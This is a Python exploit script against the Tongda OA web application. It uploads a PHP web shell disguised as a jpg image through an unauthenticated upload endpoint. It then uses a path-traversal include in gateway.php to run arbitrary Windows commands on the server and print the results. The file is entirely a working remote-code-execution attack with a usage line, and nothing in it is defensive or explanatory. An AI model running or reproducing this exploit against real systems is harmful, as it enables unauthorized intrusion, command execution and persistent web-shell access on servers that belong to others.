import requests
import re
import urllib3
import sys
#By:p1gz

urllib3.disable_warnings()
cookies = {"PHPSESSID": "123"}
headers = {"Cache-Control": "no-cache", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB", "Accept": "*/*", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5", "Connection": "close"}
data = "------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n2\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n123\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['cmd'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB--\r\n"
if len(sys.argv) < 3:
    print("Use python3 tongda-rce-cc-one.py http://127.0.0.1 net%20user")
else:
    url =str(sys.argv[1])+'/ispirit/im/upload.php'
    cmd =str(sys.argv[2])


    try:
        res=requests.post(url, headers=headers, cookies=cookies, data=data)
        #print(res.text)
        if 'OK' in res.text:
            pattern = re.compile('\d+\_\d+')
            name = pattern.findall(res.text)[0].replace('_','/')+'.jpg'
            #print(name)
            url2 = str(sys.argv[1])+'/ispirit/interface/gateway.php'
            url3 = str(sys.argv[1])+'/mac/gateway.php'
            headers2 = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate", "Accept": "*/*",
                             "User-Agent": "python-requests/2.21.0", "Content-Type": "application/x-www-form-urlencoded"}
            data2 = r'json={"url":"/general/../../attach/im/'+name+'"}&cmd='+cmd
           # print(data2)
            try:
                res2 = requests.post(url2, headers=headers2, data=data2)
                print(url2+'  result'+'\n'+res2.text)
                res3 = requests.post(url3, headers=headers2, data=data2)
                print(url3+'  result'+'\n'+res3.text)
            except:
                pass
    except:
        pass

